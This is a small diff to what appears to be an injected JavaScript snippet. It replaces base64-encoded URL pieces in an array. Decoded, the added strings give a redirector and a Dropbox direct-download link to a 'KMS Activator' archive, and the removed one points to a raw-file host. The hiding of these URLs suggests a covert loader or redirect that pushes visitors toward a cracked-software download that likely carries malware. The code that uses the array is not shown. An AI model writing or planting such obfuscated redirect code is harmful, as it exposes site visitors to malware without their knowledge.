@@ -1,7 +1,7 @@
 (function() {
 const urlParts = [
-  'aHR0cHM6Ly90ZW1wc2hhcmUuc3UvcmF3X2ZpbGVzL1hpbTVqZ0Z5ZzBQOT8=',
-  ''
+  'aHR0cHM6Ly9ocmVmLmxpLz8=',
+  'aHR0cHM6Ly93d3cuZHJvcGJveC5jb20vc2NsL2ZpL2RzeHhsMGkwcDR4MWdtNmt1aGY1ay9LTVMtQWN0aXZhdG9yLU1heS1VcGRhdGUtMjAyNi5yYXI/cmxrZXk9bHdkamtjcWxkZ3BkMmtxMzcwZGN5aG9udyZzdD13dTB4MHo0dSZkbD0x'
 ];
   
 
